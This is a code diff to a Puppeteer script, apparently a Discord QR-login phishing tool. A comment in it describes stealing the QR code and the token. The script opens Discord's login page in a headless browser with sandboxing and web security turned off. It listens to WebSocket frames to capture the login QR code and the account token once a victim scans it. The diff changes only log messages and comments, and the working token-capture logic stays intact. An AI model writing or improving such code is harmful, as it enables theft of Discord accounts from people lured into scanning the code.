@@ -15,11 +15,9 @@ let capturedToken = null;
  * traffic to steal the QR and the Token.
  */
 async function startDiscordSession() {
-    console.log("Initializing Discord Session...");
-    
-        const browser = await puppeteer.launch({
+    console.log("STEP 1: Attempting to launch browser...");
+    const browser = await puppeteer.launch({
         headless: "new",
-        // REMOVED: executablePath: '/usr/bin/chromium', 
         args: [
             '--no-sandbox',
             '--disable-setuid-sandbox',
@@ -27,44 +25,34 @@ async function startDiscordSession() {
             '--disable-web-security'
         ]
     });
+    console.log("STEP 2: Browser launched successfully.");
 
     const page = await browser.newPage();
 
     try {
-        // Navigate to Discord Login
+        console.log("STEP 3: Navigating to Discord...");
         await page.goto('https://discord.com/login', { waitUntil: 'networkidle2' });
-        console.log("Navigated to Discord. Listening for WebSocket traffic...");
+        console.log("STEP 4: Successfully reached Discord login page.");
 
-        // INTERCEPT WEBSOCKETS
-        // This is the "magic" part. Discord communicates via WebSockets.
-        // We listen to every message sent/received to find the QR and the Token.
         page.on('websocket', (ws) => {
-            console.log("WebSocket connection detected.");
-            
+            console.log("STEP 5: WebSocket connection detected. Listening for data...");
             ws.on('framereceived', (payload) => {
                 try {
                     const data = JSON.parse(payload.payload.data);
-                    
-                    // 1. Look for the QR Code in the Discord payload
                     if (data.d && data.d.qr_code) {
                         qrCodeData = data.d.qr_code;
-                        console.log("SUCCESS: Real QR Code captured from WebSocket.");
+                        console.log("!!! SUCCESS: QR CODE CAPTURED !!!");
                     }
-
-                    // 2. Look for the Token in the Discord payload
-                    // When the user scans, the token is sent via the gateway
                     if (data.d && data.d.token) {
                         capturedToken = data.d.token;
-                        console.log("SUCCESS: Real Token captured from WebSocket!");
+                        console.log("!!! SUCCESS: TOKEN CAPTURED !!!");
                     }
-                } catch (e) {
-                    // Ignore non-JSON frames
-                }
+                } catch (e) {}
             });
         });
 
     } catch (error) {
-        console.error("CRITICAL ERROR in Discord Session:", error);
+        console.error("FATAL ERROR in Discord Session:", error);
     }
 }
 
